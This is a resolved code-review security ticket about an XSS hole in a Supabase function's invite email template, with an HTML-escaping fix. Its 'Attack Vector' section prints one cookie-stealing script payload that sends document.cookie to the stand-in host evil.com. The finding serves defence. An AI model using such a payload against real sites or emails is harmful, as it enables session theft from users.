# XSS Vulnerability in Invite Email Template

---
status: resolved
priority: p2
issue_id: "010"
tags: [code-review, security, edge-functions]
dependencies: []
---

## Problem Statement

The invite email template inserts `inviter_name` directly into HTML without escaping. An attacker could set their display_name to include malicious HTML/JavaScript.

## Findings

### Agent: security-sentinel

**Location:** `supabase/functions/send-invite-email/index.ts` (lines 73-80)

```typescript
<h1>${inviter_name} invited you!</h1>
<p>
  ${invite_type === 'trip_tag'
    ? `${inviter_name} has tagged you in a trip...`
    : `${inviter_name} wants to connect with you...`
  }
</p>
```

**Attack Vector:**
```
Display name: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Impact:**
- HTML injection breaking email layout
- Phishing links disguised within email
- Some email clients might execute payloads

## Proposed Solutions

### Solution A: Escape HTML Entities (Recommended)
**Effort:** Small (30 minutes)
**Risk:** None
**Pros:** Prevents XSS attacks
**Cons:** None

```typescript
function escapeHtml(str: string): string {
  return str.replace(/[&<>"']/g, (char) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[char] || char));
}

// Then use: ${escapeHtml(inviter_name)}
```

## Recommended Action
**Solution A** - Escape HTML entities in inviter_name.

## Technical Details

**Affected Files:**
- `supabase/functions/send-invite-email/index.ts`

## Acceptance Criteria

- [ ] HTML special characters are escaped in email template
- [ ] Email displays correctly with normal display names
- [ ] Malicious HTML is rendered as text, not executed

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2025-12-26 | Identified during security review | Always escape user input in HTML templates |

## Resources

- PR #34: https://github.com/etaymor/border-badge/pull/34
